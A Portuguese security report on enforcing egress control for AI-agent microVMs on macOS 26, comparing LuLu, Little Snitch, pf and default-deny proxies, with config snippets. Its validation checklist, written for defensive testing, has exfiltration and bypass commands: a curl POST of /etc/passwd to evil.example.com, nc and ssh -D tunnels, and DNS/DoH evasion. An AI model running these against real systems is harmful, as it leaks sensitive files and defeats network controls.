# Controle de EGRESS em macOS 26 (Apple Silicon) para estação de desenvolvimento com agentes de IA: LuLu, alternativas e a camada que de fato importa

## TL;DR
- **Não ative o LuLu como controle primário de egress das VMs — ele quase certamente não enxerga o tráfego que sai de uma microVM do Virtualization.framework (shuru, `container`), porque a NAT do vmnet acontece no kernel e o LuLu/Little Snitch filtram no nível de *flow* de socket de aplicação do host.** O controle real do seu modelo de ameaça (exfiltração) precisa ser *enforced* fora do alcance do código convidado: no proxy default-deny do host, ancorado por `pf` na bridge da VM e por isolamento de rede do guest.
- **A camada que cobre o caso é a fronteira da VM: rota única para um proxy default-deny (allowlist por SNI/CONNECT), sem rota direta para a internet, com DNS bloqueado e `pf` fechando qualquer socket direto.** O `shuru` já oferece parte disso nativamente (`network.allow`, offline-by-default, secrets com placeholder via proxy), com enforcement no host, não no guest — mas com ressalvas de garantia.
- **O LuLu só agregaria valor como monitor/tripwire do *próprio host* (não das VMs), e ainda assim entra em conflito com sua preferência declarativa e com a fadiga de alarme.** Se você quiser um firewall de host declarativo e versionável, o Little Snitch 6 (regras `.lsrules` em JSON via git) é tecnicamente superior ao LuLu para esse fim — mas nenhum dos dois resolve o egress da VM.

---

## Key Findings

1. **Arquitetura do LuLu.** LuLu usa `NetworkExtension` / `NEFilterDataProvider` (System Extension, Team ID `VBG97UB4TA`, bundle `com.objective-see.lulu.extension`), operando no nível de *flow* (fluxos TCP/UDP de sockets de aplicações do host). A granularidade da regra é **por processo**, identificado preferencialmente pela *code signing* (Apple / App Store → usa o cs ID; Developer ID → cs ID + autoridade; ad-hoc/sem assinatura → caminho completo do binário), com endpoint (host/IP), porta e — a partir da 4.4.0 — notação glob/CIDR/range. Não faz DPI nem MITM; decisões de host são baseadas em SNI/metadados do flow.

2. **Cegueiras documentadas.** NEFilterDataProvider entrega apenas fluxos TCP/UDP; a Apple documenta que tráfego de apps próprios pode ser isento de filtros e VPN; FaceTime (identityservicesd) não é entregue "by design" (FB7665551); QUIC/HTTP3 sobre UDP/443 com ECH mantém o SNI cifrado e regras de hostname falham em aberto (fail-open); e o `NEFilterPacketProvider` **não** entrega tráfego de interfaces virtuais (loopback, utun) — confirmado por engenheiro da Apple (FB7721570), limitação ainda presente.

3. **Pergunta crítica (VM): não verificado, mas evidência forte de que o LuLu NÃO é útil aqui.** Não existe teste publicado de LuLu/Little Snitch contra uma VM do Virtualization.framework especificamente. A NAT do vmnet da Apple é feita **no kernel** (bridge100 em 192.168.64.1/24, helpers `bootpd`/`mDNSResponder`), diferente do `vmnet-natd` da VMware (daemon user-space que o Little Snitch atribuía como o processo conector). Sem socket de host user-space por conexão, um filtro baseado em flow provavelmente **não recebe** um flow por conexão do guest; no melhor caso veria o processo host `com.apple.Virtualization.VirtualMachine` ou os helpers de DHCP/DNS — jamais a identidade/destino do processo dentro do guest. **Trate como "não verificado", mas o ponto de controle correto é `pf` ou a camada de proxy/VM, não o LuLu.**

4. **Manutenção e macOS 26.** O LuLu é ativamente mantido (Patrick Wardle / Objective-See). A série 4.4.x traz "macOS 26 Compatibility Improvements" e compatibilidade com as mudanças de code signing do macOS 26.6 / "Golden Gate" (#883). Porém há relatos abertos e recentes de a NetworkExtension **não iniciar** em Tahoe 26.x: a issue #825 relata em Mac mini (Apple Silicon), Tahoe 26.2, "LuLu 4.2.1 NetworkExtension never attaches... filter enabled, provider refcount stays 0, no UI — The OS accepts the configuration... The OS never launches the provider binary... Refcount remains 0 indefinitely"; e há fix para "#904 Extension Not Starting" na 4.4.1. Confiabilidade de ativação em macOS 26 é uma preocupação viva e independente do método de config.

5. **Ativação não-GUI existe — mas só via MDM.** É possível ativar o LuLu headless/click-free com **dois** payloads Apple: `com.apple.system-extension-policy` (TeamID `VBG97UB4TA` + ext `com.objective-see.lulu.extension`) e `com.apple.webcontent-filter` (FilterDataProviderBundleIdentifier = `com.objective-see.lulu.extension`, PluginBundleID = `com.objective-see.lulu.app`, FilterSockets=true, FilterPackets=true). O primeiro sozinho não suprime o alerta "would like to Filter Network Content" — precisa do segundo. Requer o Mac inscrito em MDM (UAMDM).

6. **Config declarativa de regras do LuLu é frágil.** Não há payload de *managed preferences* documentado para as configurações operacionais/regras do LuLu. Regras ficam em `/Library/Objective-See/LuLu/rules.plist` (binário NSKeyedArchiver, não JSON amigável), carregadas só no startup da extensão. Import/Export por GUI é JSON (com bug histórico no timestamp, #662). Existe uma CLI de terceiros (`woop/lulu-cli`, `brew install woop/tap/lulu-cli`) explicitamente feita para agentes de IA, que escreve o `rules.plist` e recarrega a extensão (gap de ~8s no filtro no reload) — mas não é oficial e o formato de regras mudou na 4.4.1.

7. **Anthropic sandbox-runtime confirma o padrão correto.** A `sandbox-runtime` da Anthropic (open source, série v0.0.5x, 2025) roteia todo egress por proxies no host: no Linux remove o network namespace (todo tráfego vai por Unix socket bind-montado); no macOS, conforme o README, "Both HTTP/HTTPS (via HTTP proxy) and other TCP traffic (via SOCKS5 proxy) are mediated by these proxies, which enforce your domain allowlists and denylists". Default deny (`strictAllowlist`), sem pré-aprovar domínios. O README avisa explicitamente: "Even with domain allowlists, exfiltration vectors may exist. For example, allowing github.com lets a process push to any repository. With a custom MITM proxy and proper certificate setup, you can inspect and filter specific API calls to prevent this."

8. **`shuru` já implementa a fronteira certa.** É offline por padrão (guest sem device de rede); `--allow-net` habilita rede; `network.allow` no `shuru.json` restringe hosts; secrets ficam no host e o guest recebe um placeholder aleatório, com o proxy substituindo o valor real só em requisições HTTPS aos hosts especificados — "o segredo real nunca entra na VM". O enforcement é no host/proxy, não cooperação do guest.

---

## Details

### 1. O que o LuLu realmente faz (e não faz)

**API e ponto de interceptação.** LuLu é construído sobre `NetworkExtension`, especificamente uma System Extension contendo um `NEFilterDataProvider` (mais um `NEFilterPacketProvider` conforme o payload de content-filter). Ele intercepta no *flow layer*: cada novo fluxo TCP/UDP de um socket aberto por um processo do host é entregue à extensão, que devolve um veredito allow/block. Não é Endpoint Security (isso é o domínio do Santa), não é `pf`, não é kernel packet filter. A separação é clássica: app em espaço de usuário (UI, XPC client, Extension Manager) + daemon privilegiado + a extensão de rede que faz o filtro.

**Granularidade real.** A regra é ancorada no **processo**, com chave derivada da assinatura de código:
- Assinado por Apple/App Store → chave = code signing ID.
- Developer ID → chave = cs ID + primeira autoridade de assinatura.
- Ad-hoc ou sem assinatura → chave = caminho completo do binário.

Sobre isso, a regra pode restringir endpoint (host/IP), porta e — desde a 4.4.0 — usar glob (`*`), range (`-`) e CIDR (`/`). Não há inspeção de conteúdo (sem MITM). A identificação de destino por domínio depende do que o flow expõe (ex.: SNI), com as limitações abaixo.

**O que ele NÃO enxerga (documentado):**
- Fluxos que não sejam TCP/UDP entregues ao provider (a Apple garante TCP/UDP; ICMP e outros são "aconteciam por acaso").
- Tráfego de apps da Apple isentos de filtros de rede e VPN (documentado desde Big Sur; ver análise de Michael Tsai/2020 e confirmações posteriores).
- FaceTime (`identityservicesd`) — não entregue "by design" (FB7665551).
- **Interfaces virtuais** (loopback, utun) no `NEFilterPacketProvider` — confirmado por engenheiro da Apple (thread 133622, FB7721570); limitação ainda vigente.
- QUIC/HTTP3 sobre UDP/443 com ECH: o SNI fica cifrado, o NetExt não consegue parsear o flow e regras de hostname falham em aberto — caminho conhecido de evasão (HackTricks, 2025).
- Sob crash da extensão (relatado em builds iniciais de várias versões), o macOS derruba as flow rules e produtos podem "fail-open" — a GUI segue dizendo que o firewall está ativo.

**Pergunta crítica — microVM do Virtualization.framework.** *Não verificado* diretamente. A cadeia de evidências:
- Apple confirma que `NEFilterPacketProvider` não vê tráfego de interface virtual; e nunca confirmou que `NEFilterDataProvider` recebe flows de tráfego NAT'd de guest.
- Na VMware (padrão análogo, porém user-space), o Little Snitch atribuía a conexão ao daemon `vmnet-natd`, nunca ao processo do guest — ou seja, mesmo quando aparece, a identidade útil se perde.
- A vmnet da Apple faz NAT **no kernel**; a bridge100 (192.168.64.1/24) tem helpers `bootpd`/`mDNSResponder`. Sem um socket user-space por conexão, o mais provável é que o LuLu **não receba um flow por conexão do guest**; no máximo veria o runtime host `com.apple.Virtualization.VirtualMachine` como um único processo com egress amplo — inútil para regra fina.
- Práticos que precisam controlar egress dessa VM recorrem a `pf` (anchors em bridge100/utun) e a proxies MITM (o próprio "cowork" do Claude Desktop embute um proxy MITM obrigatório e não-reconfigurável pelo sandbox) — não ao LuLu/Little Snitch.

**Conclusão do item 1:** para o seu modelo de ameaça (exfiltração a partir de código dentro de microVMs), o LuLu **não é o controle**. Ele é um firewall de host por-processo; a VM é um único processo (ou nem isso) do ponto de vista dele.

**Ativação e config não-GUI.** A instalação/ativação padrão é 100% GUI (System Settings → aprovar System Extension → "Allow" no content filter). O único caminho headless documentado é **MDM** com os dois payloads citados nos Key Findings. Regras não têm payload de managed preferences; ficam em `rules.plist` binário e há a CLI de terceiros `woop/lulu-cli`. Ou seja: existe caminho declarativo, mas é via MDM + hacks de terceiros, frágil entre versões (formato mudou na 4.4.1) e ainda esbarra em bugs de ativação no Tahoe 26.x.

### 2. Alternativas no host (2025–2026)

- **Little Snitch 6 (obdev).** `NEFilterDataProvider`, por-processo (identidade por code signature), regras em grupos, **remote rule groups `.lsrules` em JSON versionáveis em git** (subscrição via HTTPS/GitHub raw), perfis, controle por CLI (`littlesnitch` para export/regras/log). É o firewall de host mais maduro e o mais alinhado à sua preferência declarativa. **Mesma cegueira de VM que o LuLu** (é NEFilter, application-layer). Custo de US$ 59 por licença única (upgrade da v5 a partir de US$ 39), conforme o comunicado da Objective Development de 21 de maio de 2024: "Little Snitch 6 supports macOS 14 (Sonoma) and later." Manutenção ativa. **Veredito:** melhor que o LuLu *se* você quiser um firewall de host declarativo — mas não resolve o egress da VM.
- **Little Snitch Mini.** Versão simplificada (monitor + blocklists), sem o motor de regras fino. Inadequado para allowlist default-deny declarativa. **Descartar** para este caso.
- **Radio Silence 3.** Compatível com macOS 26 (Tahoe), NetworkExtension, bloqueio por-app simples, sem regras granulares/versionáveis. **Descartar** — modelo de bloqueio por app não cobre allowlist por domínio/porta versionada, e não vê a VM.
- **Hands Off!** Sem release compatível com macOS 26 confirmado nas fontes; historicamente estagnado. **Descartar / marcar como não compatível confirmado.**
- **Vallum/Murus.** Front-ends de `pf`. O Murus documenta bem o `pf` do macOS. Úteis conceitualmente, mas para o seu caso é melhor escrever `pf.conf`/anchors versionados à mão (abaixo). Verifique release para 26 antes de adotar como app.
- **`pf` nativo + anchors.** **Esta é a peça de host que importa** para você: filtra na bridge100/vmnet, é declarativo (arquivo versionável), *enforced* fora do alcance do guest. Ressalva da Apple: "Packet Filter is not API" (TN3165) — é detalhe de implementação, pode mudar entre versões; não é suportado como API. Ainda assim é o mecanismo prático para amarrar a VM ao proxy.
- **`socketfilterfw` / Application Firewall.** Só inbound/por-app, sem egress allowlist. **Descartar.**
- **Santa (North Pole Security).** **Não é egress** — é *binary authorization* + File Access Authorization + bloqueio de mídia removível, via Endpoint Security. Extremamente relevante como camada *complementar* (impede execução de binários não-assinados no host, e o File Access Authorization pode proteger leitura de arquivos sensíveis), mas **não controla rede**. Ativamente mantido; conforme as release notes oficiais, "This version has been validated on macOS Tahoe 26.0" e "Santa will be ending support for macOS Ventura in January 2026"; gerenciável por Terraform/Zentral (declarativo). **Manter no radar como defesa de host, não como egress.**
- **Netiquette e monitores passivos.** Observabilidade, não enforcement. Úteis para auditoria pontual; não são controle.
- **MDM/EDR.** Fazem sentido se você já tiver MDM (necessário, aliás, para ativar LuLu/qualquer NE headless). EDR comercial é overkill para uma estação single-user e adiciona seu próprio egress.
- **Abordagens de rede:**
  - **Tailscale exit node:** roteia egress por outro nó; útil para *sair* por um ponto controlado, mas não é allowlist por domínio por si só.
  - **Cloudflare WARP/Gateway:** Gateway faz filtragem de DNS/HTTP por política — porém é serviço externo (envia metadados de navegação à Cloudflare) e depende de cliente que o guest poderia ignorar. Só é enforcement se o guest não tiver rota alternativa.
  - **DNS filtrado (Unbound/Blocky/NextDNS):** camada de *defesa em profundidade* (nega resolução de domínios fora da lista), mas **não** é suficiente sozinho — IP literal e DoH/DoT contornam DNS. Vale como reforço, não como controle único.

### 3. A camada que cobre o caso: egress do sandbox

**O que o `shuru` já garante.** Offline por padrão (o guest não tem device de rede sem `--allow-net`); `network.allow` no `shuru.json` restringe hosts; secrets ficam no host com placeholder no guest e substituição só no proxy em HTTPS para hosts nomeados. O enforcement é no host/proxy (o guest, sem `--allow-net`, sequer tem interface). **Nível de garantia:** quando a rede é dada via o proxy do shuru e o guest não recebe interface própria com rota direta, é *enforced* fora do alcance do código. Ressalva: valide na sua versão se `--allow-net` cria uma interface NAT com rota direta à internet (nesse modo o allowlist do shuru vira cooperação/filtragem no proxy, e você precisa garantir que não há rota alternativa). **Não verificado documentalmente o mecanismo exato de bloqueio por-host do shuru (SNI vs resolução) — trate como a documentar/testar.**

**Padrões de proxy default-deny.**
- **Allowlist por SNI/CONNECT (sem MITM):** o proxy lê o host do `CONNECT` (HTTP) ou o SNI do ClientHello (TLS) e decide allow/deny **sem** terminar o TLS. Fiscaliza *destino* (domínio), não conteúdo. **Não quebra** certificate pinning, gRPC, mTLS. **Não vê** o corpo — não detecta exfiltração dentro de uma conexão a um domínio permitido. É o default sensato e o que a `sandbox-runtime` da Anthropic faz por padrão (o proxy embutido não termina nem inspeciona TLS por padrão).
- **MITM com CA injetada no guest:** termina o TLS, inspeciona conteúdo (pode barrar credenciais vazando, prompt injection etc.). **Quebra** certificate pinning, muitos gRPC/mTLS, e apps que validam a cadeia. Alto custo operacional e mais superfície. Use MITM seletivamente (só nos domínios onde inspeção de conteúdo agrega e que não usam pinning), com passthrough para o resto. O mitmproxy faz *upstream cert sniffing* (gera certificado dummy a partir do CN/SAN do servidor real), mas apps com pinning rejeitam a CA do mitmproxy.
- Ferramentas: **Squid** (allowlist por SNI/CONNECT maduro), **tinyproxy** (simples, allowlist por domínio), **Envoy** (SNI/RBAC, mais complexo), **mitmproxy** (quando quiser MITM/inspeção e scripting), além dos padrões gVisor-style/`sandbox-runtime`.

**Impedir bypass do `HTTP(S)_PROXY`.** Variável de ambiente é *cooperação* — código malicioso simplesmente a ignora e abre socket direto. Enforcement real exige:
1. **VM sem rota direta:** idealmente o guest não tem interface de rede externa; todo egress sai por vsock/Unix socket para o proxy no host (padrão Anthropic/`safeyolo`: "se o agente apagar as variáveis de proxy → nenhum efeito, porque não há outro caminho de rede"). O `shuru` offline-by-default + forward por vsock é exatamente isso.
2. **Se houver interface NAT (bridge100):** feche em `pf` no host — só permita a bridge alcançar o IP:porta do proxy; bloqueie todo o resto (inclusive saída direta da subnet 192.168.64.0/24 para a internet).
3. **DNS:** bloqueie 53 direto (UDP/TCP) da subnet da VM, e bloqueie DoH/DoT conhecidos (443/853 para resolvers públicos) — force resolução só via o proxy. Sem isso, IP literal e DoH contornam qualquer allowlist de domínio.

**Interação entre camadas.** Com o desenho acima, o proxy no host vira **um único processo com egress amplo**. Nesse ponto o LuLu **não agrega** controle sobre a VM (não a enxerga) e vira ruído/fadiga de alarme — contrário à sua preferência. Ele só faria sentido para vigiar o *próprio host* (outros apps phoning home), o que é um objetivo diferente do seu modelo de ameaça. `pf` + isolamento de rede + proxy default-deny cobrem o egress do sandbox; o LuLu ficaria redundante para esse fim.

---

## 4. ENTREGÁVEIS

### 4.1 Tabela comparativa (com nível de garantia)

Legenda de garantia: **Cosmético** = burlável pelo próprio código controlado; **Dissuasivo** = atrapalha, mas contornável; **Enforced** = fora do alcance do código controlado.

| Camada / ferramenta | Modelo de enforcement | Vê tráfego da microVM (Virtualization.framework)? | Config declarativa/git | Logging/auditoria | Licença/custo | Manutenção / macOS 26 | Nível de garantia p/ egress da VM |
|---|---|---|---|---|---|---|---|
| **LuLu 4.4.x** | NEFilterDataProvider (flow, por-processo) | **Provavelmente não** (NAT no kernel; no máximo o runtime host como 1 processo) — *não verificado* | Fraca: MDM p/ ativar; regras em plist binário + CLI de terceiros | Sim (alertas/logs) | Grátis (GPLv3) | Ativo; bugs de ativação em Tahoe 26.x (#825/#798) | **Cosmético** (não é o ponto de controle) |
| **Little Snitch 6** | NEFilterDataProvider (flow, por-processo) | Mesma cegueira (application-layer) | **Boa**: `.lsrules` JSON via git; CLI | Excelente (monitor, PCAP, mapa) | Pago US$ 59 (upgrade US$ 39) | Ativo (macOS 14+) | **Cosmético** p/ VM (bom p/ host) |
| **Little Snitch Mini** | NEFilter (simplificado) | Não | Não | Básico | Pago (assinatura/IAP) | Ativo | **Descartado** |
| **Radio Silence 3** | NetworkExtension (por-app) | Não | Não | Básico | Pago | Ativo (26 ok) | **Descartado** |
| **Hands Off!** | NE/kext legado | Não | Não | — | Pago | Sem release 26 confirmado | **Descartado** |
| **`pf` + anchors** | Packet filter (kernel) na bridge/vmnet | **Sim** (filtra a bridge100 e a subnet da VM) | **Boa** (arquivo versionável) | Via `pflog`/pfctl | Nativo | Nativo (não é API — TN3165) | **Enforced** |
| **socketfilterfw** | App Firewall (inbound) | Não | Não | Fraco | Nativo | Nativo | **Descartado** (egress) |
| **Santa** | Endpoint Security (binary/file auth) | N/A (não é rede) | **Boa** (Terraform/Zentral) | Rica (telemetria) | Grátis (open source) | Ativo (Tahoe 26.0 validado) | Complementar (host), não egress |
| **Proxy default-deny (Squid/tinyproxy/Envoy) por SNI/CONNECT** | Forward proxy na única rota de saída | **Sim** (é a rota) | **Boa** (config em git) | Excelente (log por request) | Grátis | Ativo | **Enforced** (se sem rota alternativa) |
| **mitmproxy (MITM)** | Proxy terminando TLS | Sim | Boa (addons/script) | Excelente (conteúdo) | Grátis | Ativo | **Enforced** p/ inspeção; quebra pinning/gRPC/mTLS |
| **Anthropic sandbox-runtime** | Namespace removido + proxy (Unix socket) | N/A (sandbox de processo, não VM) | **Boa** (JSON) | Sim | Grátis (preview) | Ativo | **Enforced** |
| **shuru (network.allow / offline)** | Hipervisor + proxy no host, offline-by-default | **É a fronteira da VM** | **Boa** (`shuru.json` em git) | Depende do proxy | Grátis | Ativo | **Enforced** offline; a validar em `--allow-net` |
| **Tailscale exit node** | Roteamento por nó | Só se for a rota | Média | Sim (admin) | Freemium | Ativo | Dissuasivo/Enforced dependendo do isolamento |
| **Cloudflare WARP/Gateway** | Cliente + política na nuvem | Só se guest não tiver rota alt. | Média | Sim (dashboard) | Freemium | Ativo | Dissuasivo (envia metadados à Cloudflare) |
| **DNS filtrado (Unbound/Blocky/NextDNS)** | Resolução negada fora da lista | Parcial | Boa | Sim | Grátis/Freemium | Ativo | **Dissuasivo** (IP literal/DoH contornam) |

### 4.2 Arquitetura recomendada em camadas

**Princípio:** o controle tem de ser *enforced* fora do alcance do código convidado. Coloque o enforcement na fronteira da VM e no host; trate host-firewalls (LuLu/LS) como opcional para vigiar o host, não a VM.

**Dentro do guest (menor confiança — cosmético):**
- `HTTP(S)_PROXY`/`NO_PROXY` apontando ao proxy. Conveniência para apps bem-comportados; **não** conte com isso como controle.
- Nenhum secret real: injeção via placeholder do shuru.

**Na fronteira da VM (enforced):**
- Preferir **modo offline-by-default do shuru**; dar rede só via o proxy do host por vsock/Unix socket, sem interface externa no guest (padrão sandbox-runtime/safeyolo: sem rota alternativa, apagar `HTTP_PROXY` não adianta).
- Se usar `--allow-net` / `container` com bridge100/NAT: aplicar `pf` no host para permitir da subnet da VM **somente** o IP:porta do proxy; **bloquear** DNS direto (53) e DoH/DoT (443/853 a resolvers públicos) e todo o resto.
- **Proxy default-deny** (Squid/tinyproxy/Envoy) com allowlist por **SNI/CONNECT** (sem MITM) para não quebrar pinning/gRPC/mTLS. MITM (mitmproxy) só seletivo, para domínios onde inspeção de conteúdo agrega e não há pinning.

**No host (defesa em profundidade, não egress da VM):**
- `pf` como a amarração (acima) — **o item de host que de fato importa**.
- **Santa** (opcional) para binary/file-access authorization: impede execução de binários não-assinados no host e pode restringir leitura das pastas de nuvem sincronizadas por processos não-autorizados — mitiga o "acesso de leitura amplo" do seu modelo.
- **LuLu: NÃO ativar** como controle de egress da VM. Justificativa: (a) não enxerga o tráfego da VM; (b) ativação/config são majoritariamente GUI, contra sua preferência declarativa; (c) gera fadiga de alarme; (d) bugs de ativação em Tahoe 26.x. Se você quiser um firewall de host declarativo para vigiar o *próprio host*, prefira **Little Snitch 6** (regras `.lsrules` em git). Caso insista no LuLu por ser grátis/open-source, use-o apenas em modo monitor do host, ativado por MDM, ciente das limitações.

### 4.3 Snippets de configuração prontos

**a) `pf` — amarrar a subnet da VM ao proxy (arquivo versionável, ex.: `/etc/pf.anchors/egress.conf`).**
> Aviso: a Apple declara em TN3165 que "Packet Filter is not API" — isto é uso próprio em Mac que você administra, pode exigir ajuste entre versões do macOS. Ajuste `bridge100`/subnet ao que `ifconfig` mostra na sua máquina; o /24 192.168.64.0 é o default do vmnet mas confirme.

```
# egress.conf — default-deny para a subnet da VM, rota única ao proxy
vm_net = "192.168.64.0/24"
proxy_ip = "192.168.64.1"      # host na bridge
proxy_port = "3128"            # Squid/tinyproxy
vm_if = "bridge100"

# 1) permite a VM falar SOMENTE com o proxy
pass in quick on $vm_if proto tcp from $vm_net to $proxy_ip port $proxy_port

# 2) bloqueia DNS direto (força resolução via proxy)
block drop in quick on $vm_if proto { tcp udp } from $vm_net to any port 53
# 3) bloqueia DoT e DoH comuns saindo direto da VM
block drop in quick on $vm_if proto tcp from $vm_net to any port 853
# (DoH usa 443; como só o proxy é permitido em (1), 443 direto já cai no (4))

# 4) bloqueia todo o resto originado na subnet da VM
block drop in quick on $vm_if from $vm_net to any
```
Carregar:
```
sudo pfctl -a egress -f /etc/pf.anchors/egress.conf
sudo pfctl -e
```
(Para persistir, referencie o anchor no `/etc/pf.conf` e carregue via um LaunchDaemon versionado.)

**b) Squid — allowlist default-deny por SNI/CONNECT, sem MITM (`squid.conf`).**
```
http_port 3128
# allowlist versionável
acl allowed_domains dstdomain "/usr/local/etc/squid/allow.txt"
# peek no SNI para logar/decidir sem terminar TLS
acl step1 at_step SslBump1
ssl_bump peek step1
ssl_bump splice allowed_domains
ssl_bump terminate all
http_access allow CONNECT allowed_domains
http_access allow allowed_domains
http_access deny all
```
`allow.txt` (git):
```
.api.anthropic.com
.registry.npmjs.org
.pypi.org
.github.com
```

**c) tinyproxy — alternativa mínima (`tinyproxy.conf`).**
```
Port 3128
Listen 192.168.64.1
FilterDefaultDeny Yes
Filter "/usr/local/etc/tinyproxy/allow.txt"
FilterExtended On
Allow 192.168.64.0/24
```

**d) `shuru.json` — offline-by-default + allowlist + secret via placeholder.**
```json
{
  "cpus": 4,
  "memory": 4096,
  "disk_size": 8192,
  "allow_net": true,
  "mounts": ["./src:/workspace"],
  "network": {
    "allow": ["api.anthropic.com", "registry.npmjs.org", "pypi.org", "github.com"]
  },
  "secrets": {
    "API_KEY": { "from": "ANTHROPIC_API_KEY", "hosts": ["api.anthropic.com"] }
  }
}
```
Uso sem rede quando não precisar: `shuru run -- <cmd>` (offline). Só habilite `allow_net` no projeto que exige, e mantenha a `allow` mínima.

**e) LuLu via MDM (se optar por vigiar o host) — `.mobileconfig` (dois payloads).**
```xml
<!-- Payload 1: aprovar a System Extension -->
<key>PayloadType</key><string>com.apple.system-extension-policy</string>
<key>AllowedSystemExtensions</key>
<dict><key>VBG97UB4TA</key><array><string>com.objective-see.lulu.extension</string></array></dict>

<!-- Payload 2: pré-configurar o content filter (suprime o alerta) -->
<key>PayloadType</key><string>com.apple.webcontent-filter</string>
<key>FilterType</key><string>Plugin</string>
<key>FilterSockets</key><true/>
<key>FilterPackets</key><true/>
<key>PluginBundleID</key><string>com.objective-see.lulu.app</string>
<key>FilterDataProviderBundleIdentifier</key><string>com.objective-see.lulu.extension</string>
<key>FilterPacketProviderBundleIdentifier</key><string>com.objective-see.lulu.extension</string>
<key>UserDefinedName</key><string>LuLu</string>
```
Regras (não-oficial): `/Library/Objective-See/LuLu/rules.plist` (binário; use `woop/lulu-cli` para escrever e `sudo lulu-cli reload`, ciente do gap de ~8s e da fragilidade entre versões).

### 4.4 Checklist de validação adversarial

Rode **de dentro do guest** e confirme o resultado esperado. Objetivo: provar que o controle é *enforced*, não cosmético.

1. **POST a domínio não-allowlisted:** `curl -x http://192.168.64.1:3128 -d @/etc/passwd https://evil.example.com` → deve ser **negado pelo proxy** (403/deny). E `curl --noproxy '*' https://evil.example.com` (socket direto) → deve **falhar** (pf bloqueia).
2. **DNS direto:** `dig @8.8.8.8 evil.example.com` e `nslookup evil.example.com 1.1.1.1` → **timeout/bloqueado** (pf porta 53).
3. **IP literal sem DNS:** `curl --noproxy '*' https://93.184.216.34/` → **bloqueado** (pf, todo o resto da subnet).
4. **DoH:** `curl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=evil.example.com&type=A'` direto → **bloqueado** (só o proxy pode 443; DoH direto cai). Se usar allowlist de domínio no proxy, garanta que resolvers DoH públicos **não** estão na allowlist.
5. **Protocolo não-HTTP:** `nc -w3 evil.example.com 6667` (IRC) / túnel SSH `ssh -D` → **bloqueado** (só CONNECT ao proxy; proxy não faz forward para portas/protocolos fora da política).
6. **Canal via processo do sistema (no host):** tente disparar egress por um binário do sistema isento (ex.: via app da Apple) — confirme que a VM não tem esse caminho (ela não é um processo do host) e que a política de host (se houver LuLu/LS) documenta a isenção. Registre como risco residual (abaixo).
7. **Bypass de proxy env:** dentro do guest, `unset HTTP_PROXY HTTPS_PROXY; curl https://api.anthropic.com` → se **ainda assim** só funciona via a rota do proxy (ou falha sem ela), o enforcement é estrutural; se passar direto, sua VM tem rota alternativa — corrija o isolamento/`pf`.
8. **Exfil dentro de domínio permitido:** `curl -x proxy https://github.com/<gist-controlado> -d @segredo` → **passa** (esperado com allowlist por SNI). Documente como risco residual; só MITM/inspeção mitiga.

### 4.5 Riscos residuais (mesmo com tudo implementado)

- **Exfiltração por domínio permitido.** Allowlist por SNI/CONNECT não vê conteúdo: dados podem sair embutidos em requisições a `github.com`, `api.anthropic.com`, `*.npmjs.org` etc. (gists, issues, pacotes, prompts). É exatamente o cenário que o README da `sandbox-runtime` alerta: "allowing github.com lets a process push to any repository. With a custom MITM proxy and proper certificate setup, you can inspect and filter specific API calls to prevent this." Só MITM seletivo mitiga — e quebra pinning.
- **Canais de baixa largura de banda / covert.** Timing, nomes de subdomínio permitidos, cache poisoning, DNS via o próprio proxy (se resolução delegada) podem vazar pequenos volumes.
- **Leitura ampla no host.** O código roda com sua identidade e lê pastas de nuvem sincronizadas; mesmo sem egress da VM, um binário no *host* (fora da VM) poderia exfiltrar. Santa (file-access auth) e mounts seletivos do shuru reduzem, não eliminam.
- **QUIC/HTTP3/ECH.** Se qualquer caminho permitir UDP/443 direto, o SNI cifrado (ECH) inviabiliza allowlist por hostname. Bloqueie UDP/443 direto da VM; force HTTP3 a degradar para o proxy.
- **Fragilidade do `pf`.** Não é API (TN3165); atualizações do macOS podem alterar nomes de interface/comportamento. Reaplicação e testes pós-update são obrigatórios.
- **Bugs de fail-open de NE.** Se você mantiver um firewall NE no host, crashes da extensão podem abrir o filtro silenciosamente (relatos em macOS 15/26). Não confie nele como única barreira.
- **Confiança no hipervisor.** VM não é "mais segura" por definição; depende do Virtualization.framework e da emulação de dispositivos. Escape de VM, embora improvável, colapsaria todas as camadas.
- **shuru `--allow-net` não verificado.** O mecanismo exato de bloqueio por-host do shuru (SNI vs resolução, host vs cooperação do guest) não está documentalmente confirmado — teste com o checklist antes de confiar.

---

## Recommendations

**Estágio 0 — imediato (esta semana):**
1. **Não ative o LuLu** para controlar as VMs. Se já pretende vigiar o host, adie a decisão até o Estágio 3.
2. Padronize o `shuru` em **offline-by-default**; só habilite `allow_net` por projeto, com `network.allow` mínima. Injete secrets por placeholder.
3. Suba o **proxy default-deny** (comece com Squid ou tinyproxy, allowlist em git).

**Estágio 1 — amarrar a fronteira:**
4. Aplique o **anchor `pf`** que só deixa a subnet da VM falar com o proxy; bloqueie 53/853/UDP-443 diretos. Persista via LaunchDaemon versionado.
5. Rode o **checklist adversarial** inteiro. **Benchmark de aprovação:** itens 1–7 devem falhar/bloquear como esperado. Se qualquer socket direto passar, o isolamento está furado — pare e corrija antes de prosseguir.

**Estágio 2 — endurecer o host:**
6. Avalie **Santa** (binary + file-access authorization) para conter o "acesso de leitura amplo" às pastas de nuvem e execução de binários não-assinados no host. Gerencie por config versionada (Zentral/Terraform ou StaticRules).
7. Reduza mounts do shuru ao mínimo (read-only por padrão).

**Estágio 3 — firewall de host (opcional):**
8. Se ainda quiser visibilidade de egress do *host*, prefira **Little Snitch 6** com `.lsrules` em git, não o LuLu. Ative só se a fadiga de alarme for gerenciável (use Silent Mode + regras pré-carregadas).

**Gatilhos que mudam a recomendação:**
- Se você precisar **inspecionar conteúdo** (barrar credenciais/prompt-injection saindo), promova domínios selecionados de SNI-splice para **MITM (mitmproxy)** com CA injetada no guest — aceitando quebra de pinning nesses domínios.
- Se surgir **evidência publicada** de que um NEFilter host-firewall enxerga e atribui corretamente flows de VM do Virtualization.framework, reavalie o LuLu/LS como camada adicional (hoje: não verificado, provavelmente não).
- Se o `shuru --allow-net` provar (no checklist) criar rota direta contornável, **force o modo vsock/sem-interface** ou migre para o padrão `sandbox-runtime`/`safeyolo`.

---

## Caveats

- **Datas/versões:** o site da Objective-See lista o download como **LuLu v4.4.3** (versão que você tem instalada), mas as DMGs mais recentes visíveis na página de releases do GitHub são 4.4.1/4.4.2 (LuLu_4.4.2.dmg SHA256 `93665CE8...20238C`) — **confirme a 4.4.3 antes de citá-la como oficial**. macOS 26 ("Tahoe"/Golden Gate 26.6). Compatibilidade com 26 é declarada pela Objective-See, mas há relatos abertos (2025–2026) de a NetworkExtension não iniciar em 26.x (issues #825/#798) — verifique na sua build antes de confiar.
